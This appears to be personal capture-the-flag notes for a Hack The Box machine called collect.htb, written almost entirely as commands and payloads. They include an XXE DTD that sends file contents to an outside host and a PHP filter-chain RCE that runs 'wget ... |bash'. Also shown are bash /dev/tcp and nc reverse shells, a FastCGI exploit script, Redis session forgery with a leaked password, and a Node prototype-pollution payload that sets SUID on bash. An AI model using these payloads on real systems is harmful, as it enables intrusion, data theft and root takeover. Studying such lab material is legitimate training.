access web page and scroll down
see collect.htb

echo "10.10.11.192 collect.htb" >> /etc/hosts
nmap -p- --min-rate 3000 collect.htb -> 22, 80 and 6379/tcp redis
nmap -p 22,80,6379 -sCV collect.htb

ffuf -c -w '/root/Downloads/SecLists/Discovery/DNS/subdomains-top1million-20000.txt' -u http://collect.htb -H "Host: FUZZ.collect.htb" -X POST --fs 26197,0 -> get "forum" and "developers"
ffuf -c -w '/root/Downloads/Tools/raft-medium-directories.txt' -u http://collect.htb/FUZZ -X POST --fs 0

----------------------------------------------------------------------------------------------------------
POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

token=ddac62a28254561001277727cb397baf
----------------------------------------------------------------------------------------------------------

XXE INJECTION - FILE READ
nano test.dtd

----------------------------------------------------------------------------------------------------------
<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource='>
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.16.4/?file=%file;'>">
%eval;
%exfiltrate;
----------------------------------------------------------------------------------------------------------

manage_api=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.16.4/test.dtd"> %xxe;]><root><method>POST</method><uri>/auth/register</uri><user><username>test2</username><password>test2</password></user></root>

change to "../resource=/var/www/developers/.htpasswd'>"
echo "ZGV2ZWxvcGVyc19ncm91cDokYXByMSRNektBNXlYWSREd0V6Lmp4VzlVU1dvOC5nb0Q3alkxCg==" | base64 -d
developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1

nano hash.txt

----------------------------------------------------------------------------------------------------------
$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
----------------------------------------------------------------------------------------------------------

john hash.txt --wordlist=../rockyou

change to "../resource=/var/www/developers/../bootstrap.php'>"
echo "PD9waHAKaW5pX3NldCgnc2Vzc2lvbi5zYXZlX2hhbmRsZXInLCdyZWRpcycpOwppbmlfc2V0KCdzZXNzaW9uLnNhdmVfcGF0aCcsJ3RjcDovLzEyNy4wLjAuMTo2Mzc5Lz9hdXRoPUNPTExFQ1RSM0QxU1BBU1MnKTsKCnNlc3Npb25fc3RhcnQoKTsKCnJlcXVpcmUgJy4uL3ZlbmRvci9hdXRvbG9hZC5waHAnOwo=" | base64 -d

----------------------------------------------------------------------------------------------------------
?php
ini_set('session.save_handler','redis');
ini_set('session.save_path','tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS');

session_start();

require '../vendor/autoload.php';
----------------------------------------------------------------------------------------------------------

redis-cli -h collect.htb
AUTH COLLECTR3D1SPASS
keys *
get PHPREDIS_SESSION:r8qne20hig1k3li6prgk91t33j
set PHPREDIS_SESSION:r8qne20hig1k3li6prgk91t33j 'username|s:4:"test";role|s:5:"admin";auth|s:4:"test";'
refresh the page and pass form

open burp and inspect "..?page="
LFI2RCE (https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
PHP FILTER (https://github.com/synacktiv/php_filter_chain_generator)
python3 php_filter_chain_generator.py --chain "<?= 'id'?>"
"..?page=<generated code>"
python3 php_filter_chain_generator.py --chain "<?=`wget -O - 10.10.14.152/b|bash` ?>"
"..?page=<generated code>"
bash -i &>/dev/tcp/10.10.16.4/9001 <&1

cat login.php
mysql -u webapp_user -p Str0ngP4ssw0rdB*12@1
use developers;

PENTESTING FASTCGI (https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi)
nano victor.sh

----------------------------------------------------------------------------------------------------------
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/tmp/index.php" # Exisiting file path

HOST='127.0.0.1'
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
----------------------------------------------------------------------------------------------------------

chmod +x victor.sh
./victor.sh

change "whoami('<here>')" to:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 9002 >/tmp/f
cat user.txt

select * from users;
update users set role='admin' where username='test';

----------------------------------------------------------------------------------------------------------
curl http://127.0.0.1:3000/auth/login -H "content-type: application/json" -d '{"username":"test2", "password":"test2"}'
{"Status":"Ok","Header":{"x-access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdDIiLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2NzcwMTEyNjgsImV4cCI6MTY3NzAxNDg2OH0.XT-rwrznjVptZBKhgv5aKHBejmV6k8U2TabCNeQ72_E"}}
----------------------------------------------------------------------------------------------------------

cat documentation.js

Prototype Pollution (https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#exec-exploitation)

----------------------------------------------------------------------------------------------------------
curl http://127.0.0.1:3000/admin/messages/send -H "X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdDIiLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2NzcwMTEyNjgsImV4cCI6MTY3NzAxNDg2OH0.XT-rwrznjVptZBKhgv5aKHBejmV6k8U2TabCNeQ72_E" -H "content-type: application/json" -d '{"text":{"constructor":{"prototype":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"chmod +s /usr/bin/bash\").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}}}'
----------------------------------------------------------------------------------------------------------